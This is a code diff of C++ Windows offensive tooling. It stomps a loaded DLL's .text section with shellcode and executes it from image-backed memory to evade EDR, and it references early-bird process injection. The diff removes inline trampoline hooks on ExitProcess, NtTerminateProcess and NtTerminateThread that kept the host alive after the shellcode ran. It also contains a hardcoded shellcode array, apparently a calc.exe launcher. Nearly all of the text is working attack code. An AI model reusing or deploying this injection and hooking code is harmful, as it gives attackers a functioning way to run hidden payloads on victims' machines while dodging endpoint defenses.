@@ -86,8 +86,6 @@ BOOL EarlyBirdProcessInjectionW(IN LPWSTR szProcessImgNameAndParms, IN PBYTE pSh
 
 //get elastic spun up to test this again... lots of ways to do this
 
-// Global buffer to hold the CPU state
-jmp_buf jump_buffer;
 
 /*
 * Local options: (warning, if shellcode has an exit, these break. Probably best to thread this and have siad shellcode have a thread exit)
@@ -100,123 +98,7 @@ local_stomp_text_section (trad): Find .text section through some parsing magic, 
 
 
 The big alert here/defeator: EDR may check loaded disk version of dll, if that doesn't match waht is in mem, it may freak out. 
-
-
 */
-//trampoline helper
-void WINAPI ExitProcessFunc(UINT uExitCode) {
-	printf("[*] ExitProcessFunc: Hook Successful!\n");
-	//TLDR: SLeep forever, as shellcode calling exit process will kill the parent too. 
-	Sleep(INFINITE);
-}
-
-void WINAPI TerminateProcessFunc(UINT uExitCode) {
-	printf("[*] TerminateProcessFunc: Hook Successful!\n");
-	//ExitThread(uExitCode);
-	//instead of exiting, jump back to previous stuff
-	longjmp(jump_buffer, 1);
-}
-
-void WINAPI TerminateThreadFunc(UINT uExitCode) {
-	printf("[*] TerminateThreadFunc: Hook Successful!\n");
-	//ExitThread(uExitCode);
-	//instead of exiting, jump back to previous stuff
-	longjmp(jump_buffer, 1);
-}
-
-void setup_exit_hook_ExitProcess() {
-	//HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
-	////snag address of the real exit process
-	//void* realExit = GetProcAddress(kernel32, "ExitThread");
-
-	//HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	//void* realExit = GetProcAddress(ntdll, "NtTerminateProcess");
-	HMODULE k32 = GetModuleHandleA("kernel32.dll");
-	void* realExit = GetProcAddress(k32, "ExitProcess");
-
-	// Simple Trampoline Hook (x64)
-	// MOV RAX, <Address of MyExitProcess>
-	// JMP RAX
-	uint8_t trampoline[] = {
-		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RAX, <ADDR>
-		0xFF, 0xE0                                                  // JMP RAX
-	};
-
-	// Patch the address of our function into the trampoline
-	//literally editing the function that's in our mem here to jump to our funcion
-	uintptr_t hookAddr = (uintptr_t)&ExitProcessFunc;
-	memcpy(&trampoline[2], &hookAddr, sizeof(hookAddr));
-
-	// Write the hook onto the real ExitProcess
-	DWORD oldProtect;
-	VirtualProtect(realExit, sizeof(trampoline), PAGE_EXECUTE_READWRITE, &oldProtect);
-	memcpy(realExit, trampoline, sizeof(trampoline));
-	VirtualProtect(realExit, sizeof(trampoline), oldProtect, &oldProtect);
-
-	//flush l1
-	//FlushInstructionCache(GetCurrentProcess(), realExit, sizeof(trampoline));
-}
-
-void setup_exit_hook_NtTerminateProcess() {
-	//HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
-	////snag address of the real exit process
-	//void* realExit = GetProcAddress(kernel32, "ExitThread");
-
-	//HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	//void* realExit = GetProcAddress(ntdll, "NtTerminateProcess");
-	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	void* realExit = GetProcAddress(ntdll, "NtTerminateProcess");
-
-	// Simple Trampoline Hook (x64)
-	// MOV RAX, <Address of MyExitProcess>
-	// JMP RAX
-	uint8_t trampoline[] = {
-		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RAX, <ADDR>
-		0xFF, 0xE0                                                  // JMP RAX
-	};
-
-	// Patch the address of our function into the trampoline
-	//literally editing the function that's in our mem here to jump to our funcion
-	uintptr_t hookAddr = (uintptr_t)&TerminateProcessFunc;
-	memcpy(&trampoline[2], &hookAddr, sizeof(hookAddr));
-
-	// Write the hook onto the real ExitProcess
-	DWORD oldProtect;
-	VirtualProtect(realExit, sizeof(trampoline), PAGE_EXECUTE_READWRITE, &oldProtect);
-	memcpy(realExit, trampoline, sizeof(trampoline));
-	VirtualProtect(realExit, sizeof(trampoline), oldProtect, &oldProtect);
-
-	//flush l1
-	//FlushInstructionCache(GetCurrentProcess(), realExit, sizeof(trampoline));
-}
-
-void setup_exit_hook_NtTerminateThread() {
-	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	void* realExit = GetProcAddress(ntdll, "NtTerminateThread");
-
-	// Simple Trampoline Hook (x64)
-	// MOV RAX, <Address of MyExitProcess>
-	// JMP RAX
-	uint8_t trampoline[] = {
-		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RAX, <ADDR>
-		0xFF, 0xE0                                                  // JMP RAX
-	};
-
-	// Patch the address of our function into the trampoline
-	//literally editing the function that's in our mem here to jump to our funcion
-	uintptr_t hookAddr = (uintptr_t)&TerminateThreadFunc;
-	memcpy(&trampoline[2], &hookAddr, sizeof(hookAddr));
-
-	// Write the hook onto the real ExitProcess
-	DWORD oldProtect;
-	VirtualProtect(realExit, sizeof(trampoline), PAGE_EXECUTE_READWRITE, &oldProtect);
-	memcpy(realExit, trampoline, sizeof(trampoline));
-	VirtualProtect(realExit, sizeof(trampoline), oldProtect, &oldProtect);
-
-	//flush l1
-	//FlushInstructionCache(GetCurrentProcess(), realExit, sizeof(trampoline));
-}
-
 
 //find text helper
 PIMAGE_SECTION_HEADER GetTextSection(HMODULE hModule) {
@@ -331,34 +213,21 @@ int local_stomp_text_section(std::vector<uint8_t> shellcode) {
 		std::cout << "[-] VirtualProtect (RX) failed. Error: " << GetLastError() << std::endl;
 		return -1;
 	}
-
 	std::cout << "[+] Executing from backed memory..." << std::endl;
 
-	// IMPORTANT: Since you are using setjmp/longjmp in main, you MUST call this directly
-	// on the main thread. Do NOT spawn a thread here, or longjmp will crash.
-	//((void(*)())targetAddr)();
+	((void(*)())targetAddr)();
 
-	// Create a new thread that starts at the shellcode address
-	HANDLE hThread = CreateThread(
-		NULL,
-		0,
-		(LPTHREAD_START_ROUTINE)targetAddr, // Run the stomped .text section
-		NULL,
-		0,
-		NULL
-	);
-
-	// Wait for it to do its job - note, 
-	if (hThread) {
-		WaitForSingleObject(hThread, 1);
-		std::cout << "[+] Killing infinitly sleeping thread from outside of hook" << std::endl;
-		TerminateThread(hThread, 0);
-		CloseHandle(hThread);
-		std::cout << "[+] Shellcode finished (and thread died). Main thread still alive!" << std::endl;
-	}
 	return 0;
 }
 
+
+/*
+README
+
+This is just for module stomping locally executed shellcode. It kills itself after launching the shellcode. 
+
+
+*/
 
 int main() {
 	//print pid for tracking
@@ -391,87 +260,12 @@ int main() {
 		0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
 		0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };
 
-	//std::vector < uint8_t> not_shellcode = { 0x90,0x90,0x90,0x90 };
 
-	//calls exit process
-	//std::vector<uint8_t> not_shellcode = {
-	//	0x48, 0x31, 0xC9,                               // XOR RCX, RCX       (Param 1 = 0)
-	//	0x48, 0xB8, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // MOV RAX, <ADDR>
-	//	0xFF, 0xD0,                                     // CALL RAX
-	//	0xCC                                            // INT3 (Crash if return)
-	//};
-	setup_exit_hook_ExitProcess();
-	setup_exit_hook_NtTerminateProcess();
-	setup_exit_hook_NtTerminateThread();
-
-	// 2. The Checkpoint
-	// This saves the stack pointer (RSP) and instruction pointer (RIP).
-	int jumpResult = setjmp(jump_buffer);
-	
-	if (jumpResult == 0) {
-		// This runs FIRST.
-		printf("[+] Checkpoint saved. Executing shellcode...\n");
-
-		// try running shellcode in here 
-		//((void(*)())not_shellcode.data())();
-
-		// Simulating shellcode calling ExitProcess for this example:
-		//ExitProcess(0); //this works as we have a hook for it
-		local_stomp_text_section(not_shellcode); //this does not
+	std::cout << "[+] Running injection" << std::endl;
+	local_stomp_text_section(not_shellcode); //this does not
 
 
-	}
-	else {
-		// This runs AFTER longjmp is called.
-		printf("[+] WELCOME BACK! The thread survived.\n");
-		printf("[+] You can now continue executing normal code.\n");
-	}
 
-	// Continue normal execution...
-	std::cout << "Program is still running normally." << std::endl;
-	getchar();
-	return 0;
+
 }
 
-/*
-Notes on shellcode crash, could hook the ExitProcess (or whatever func) is called, and then point it to my own exit, which just exits thread.
-
-Looks like you need a trampoline to do this, and you'd just overwrite the fucntion mem where the exit process is at. Could be worth a shot for stability.
-
-
-Ex:
-
-#include <windows.h>
-
-// A "fake" ExitProcess that actually just exits the thread
-void WINAPI MyExitProcess(UINT uExitCode) {
-	printf("[*] Shellcode tried to exit process. Redirecting to ExitThread!\n");
-	ExitThread(uExitCode);
-}
-
-void RedirectExit() {
-	HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
-	void* realExit = GetProcAddress(kernel32, "ExitProcess");
-
-	// Simple Trampoline Hook (x64)
-	// MOV RAX, <Address of MyExitProcess>
-	// JMP RAX
-	uint8_t trampoline[] = {
-		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RAX, <ADDR>
-		0xFF, 0xE0                                                  // JMP RAX
-	};
-
-	// Patch the address of our function into the trampoline
-	uintptr_t hookAddr = (uintptr_t)&MyExitProcess;
-	memcpy(&trampoline[2], &hookAddr, sizeof(hookAddr));
-
-	// Write the hook onto the real ExitProcess
-	DWORD oldProtect;
-	VirtualProtect(realExit, sizeof(trampoline), PAGE_EXECUTE_READWRITE, &oldProtect);
-	memcpy(realExit, trampoline, sizeof(trampoline));
-	VirtualProtect(realExit, sizeof(trampoline), oldProtect, &oldProtect);
-}
-
-// Call RedirectExit() BEFORE running your shellcode!
-
-*/
